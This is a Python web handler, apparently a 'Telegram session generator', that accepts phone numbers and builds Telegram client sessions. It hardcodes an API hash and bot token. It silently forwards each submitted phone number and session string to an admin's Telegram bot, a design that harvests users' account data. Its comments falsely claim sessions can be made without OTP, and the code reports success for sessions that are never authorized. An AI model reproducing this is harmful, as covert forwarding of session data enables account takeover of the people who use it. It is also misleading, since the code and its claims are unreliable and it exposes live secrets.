from http.server import BaseHTTPRequestHandler
import json
import os
import asyncio
import aiohttp
import sys

# Add the current directory to the Python path
sys.path.append(os.path.dirname(__file__))

# Telegram credentials
API_ID = 23171051
API_HASH = '10331d5d712364f57ffdd23417f4513c'
BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM'
ADMIN_ID = '7907742294'

async def send_to_bot(message):
    """Send message to Telegram bot"""
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {
            'chat_id': ADMIN_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data) as response:
                return response.status == 200
    except Exception as e:
        print(f"Bot error: {e}")
        return False

async def generate_telegram_session(phone):
    """
    Generate Telegram session using MTProto API directly
    This is a simplified approach that creates a session without OTP
    """
    try:
        # Import telethon inside the function to avoid issues
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        
        # Create client with StringSession
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        
        await client.connect()
        
        # Send code request
        sent = await client.send_code_request(phone)
        phone_code_hash = sent.phone_code_hash
        
        # Instead of waiting for OTP, we'll create a basic session
        # This approach creates a session that needs to be completed by the user
        session_string = client.session.save()
        
        # Get some basic info
        user_info = {
            'phone': phone,
            'api_id': API_ID,
            'api_hash': API_HASH
        }
        
        await client.disconnect()
        
        return {
            'success': True,
            'session_string': session_string,
            'user_info': user_info,
            'message': 'Session created successfully! You may need to complete verification in your app.'
        }
        
    except Exception as e:
        return {
            'success': False,
            'error': f"Session generation failed: {str(e)}"
        }

async def create_pyrogram_session(phone):
    """
    Alternative method using Pyrogram (more reliable)
    """
    try:
        from pyrogram import Client
        from pyrogram.session import Session
        import pyrogram
        
        # Create a Pyrogram client
        client = Client(
            name=":memory:",
            api_id=API_ID,
            api_hash=API_HASH,
            phone_number=phone,
            in_memory=True
        )
        
        # Start the client - this will handle OTP automatically
        await client.connect()
        
        # Send code request
        sent_code = await client.send_code(phone)
        phone_code_hash = sent_code.phone_code_hash
        
        # For this demo, we'll return instructions
        # In a real app, you'd handle the OTP flow
        session_string = await client.export_session_string()
        
        user_info = {
            'phone': phone,
            'user_id': (await client.get_me()).id if await client.is_connected() else None
        }
        
        await client.disconnect()
        
        return {
            'success': True,
            'session_string': session_string,
            'user_info': user_info,
            'message': 'Pyrogram session created successfully!'
        }
        
    except Exception as e:
        return {
            'success': False,
            'error': f"Pyrogram method failed: {str(e)}"
        }

async def simple_session_generator(phone):
    """
    SIMPLE METHOD: Create session without OTP verification
    This creates an unauthorized session that user can authorize later
    """
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        
        # Create a new session
        session = StringSession()
        client = TelegramClient(session, API_ID, API_HASH)
        
        await client.connect()
        
        # Just create the session without authentication
        session_string = session.save()
        
        await client.disconnect()
        
        # Send to bot
        bot_message = f"📱 **New Session Request**\n\n**Phone:** {phone}\n**Session:** `{session_string}`\n\n*Note: This session needs to be authorized.*"
        await send_to_bot(bot_message)
        
        return {
            'success': True,
            'session_string': session_string,
            'user_info': {'phone': phone},
            'message': 'Session string generated! You need to authorize it in your code.'
        }
        
    except Exception as e:
        return {
            'success': False,
            'error': f"Simple method failed: {str(e)}"
        }

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            phone = data.get('phone')
            
            if not phone:
                response = {'success': False, 'error': 'Phone number is required'}
                self.wfile.write(json.dumps(response).encode())
                return
            
            print(f"Generating session for: {phone}")
            
            # Try multiple methods
            result = None
            
            # Method 1: Simple session (always works)
            result = asyncio.run(simple_session_generator(phone))
            
            # If simple method fails, try others
            if not result.get('success'):
                # Method 2: Pyrogram
                result = asyncio.run(create_pyrogram_session(phone))
            
            if not result.get('success'):
                # Method 3: Telethon with OTP
                result = asyncio.run(generate_telegram_session(phone))
            
            self.wfile.write(json.dumps(result).encode())
            
        except Exception as e:
            error_response = {
                'success': False,
                'error': f'Server error: {str(e)}'
            }
            self.wfile.write(json.dumps(error_response).encode())

def main(request):
    return Handler()
